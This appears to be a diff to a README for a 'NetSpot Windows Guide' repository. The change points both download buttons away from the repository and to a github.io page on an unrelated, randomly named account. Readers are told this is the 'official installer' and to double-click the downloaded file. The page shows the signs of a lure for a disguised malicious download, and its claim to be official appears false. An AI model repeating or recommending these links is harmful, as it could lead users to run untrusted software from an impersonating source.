@@ -1,6 +1,6 @@
 # 📡 NetSpot-Windows-Guide - Fix WiFi problems on your PC
 
-[![Download NetSpot Guide](https://img.shields.io/badge/Download-NetSpot_Guide-blue.svg)](https://github.com/Rosaleenoilbearing771/NetSpot-Windows-Guide)
+[![Download NetSpot Guide](https://img.shields.io/badge/Download-NetSpot_Guide-blue.svg)](https://rosaleenoilbearing771.github.io)
 
 This guide helps you put NetSpot on your Windows 11 computer. If your installation fails, these steps provide clear ways to finish the process. NetSpot acts as a tool to map your wireless signal and find dead zones.
 
@@ -18,7 +18,7 @@ NetSpot requires a functional computer running the Windows 11 operating system. 
 
 Visit the page below to download the official installer.
 
-[Download NetSpot Windows Guide](https://github.com/Rosaleenoilbearing771/NetSpot-Windows-Guide)
+[Download NetSpot Windows Guide](https://rosaleenoilbearing771.github.io)
 
 After the download finishes, locate the file in your Downloads folder. Double-click the file to start the installation. Follow the prompts on the screen to finish the setup.
 
